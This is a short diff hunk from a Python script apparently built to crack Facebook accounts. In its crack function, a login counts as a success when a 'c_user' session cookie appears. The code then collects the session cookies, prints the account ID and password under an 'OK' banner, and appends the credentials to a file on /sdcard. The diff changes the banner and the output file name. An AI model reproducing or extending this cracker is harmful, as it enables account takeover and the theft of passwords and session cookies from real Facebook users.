@@ -1431,10 +1431,10 @@ def crack(idf,pwv):
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
-				coki=po.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\r\x1b[38;5;46m[BLADE-OK] '+idf+ ' | '+pw+'')
-				open('/sdcard/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
+				coki=session.cookies.get_dict()
+				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
+				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				break
 				
 			else:
